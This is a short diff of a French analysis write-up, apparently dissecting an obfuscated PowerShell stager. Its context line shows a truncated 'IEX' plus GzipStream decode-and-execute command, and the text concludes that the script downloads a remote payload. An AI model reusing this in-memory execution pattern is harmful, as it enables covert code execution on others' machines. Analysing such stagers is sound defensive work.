@@ -76,11 +76,11 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Comp
 <br/>
 
 _B64_01_ contient une chaine très longue qui ne ressemble pas à du BASE64 : 
-
 <br/>  
-![image](https://github.com/user-attachments/assets/271d6e1e-3c4c-42a0-9ebb-2c546999bb1b)  
 
+![image](https://github.com/user-attachments/assets/271d6e1e-3c4c-42a0-9ebb-2c546999bb1b)  
 <br/>
+
 Verdict : 
   - [X] Télécharger le script distant :sunglasses:
   
